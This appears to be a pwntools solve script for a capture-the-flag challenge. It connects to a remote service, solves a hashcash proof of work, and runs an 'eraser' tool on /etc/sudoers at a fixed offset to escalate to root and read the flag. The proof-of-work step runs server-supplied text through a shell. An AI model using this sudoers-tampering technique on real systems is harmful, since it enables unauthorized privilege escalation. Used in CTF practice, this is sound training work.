#!/usr/bin/env python3

from pwn import *

def get_conn():
	host = args.HOST or ''
	port = int(args.PORT or 5000)
	return remote(host, port)

io = get_conn()
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)

def solve_pow():
    from subprocess import check_output
    cmd = rl().strip().decode().split('hashcash')[1]
    cmd = f'hashcash{cmd}'
    info(f"Solving PoW with cmd: {cmd}")
    result = check_output(cmd, shell=True)
    result = result.replace(b'hashcash stamp: ', b'').strip()
    info(f"PoW result: {result}")
    sl(result)

io.recvuntil(b'Due to resource heavy setup')
solve_pow()

info("Waiting for machine to boot")
sla(b'Password:', b'ctf')
OFFSET = 0xe2
sla(b'$', f'eraser /etc/sudoers {OFFSET}'.encode())
sla(b'$', b'sudo -S cat /flag.txt')
sla(b'Password:', b'ctf')

print(ru(b'ctf@'))

sl(b'exit')

# ia()
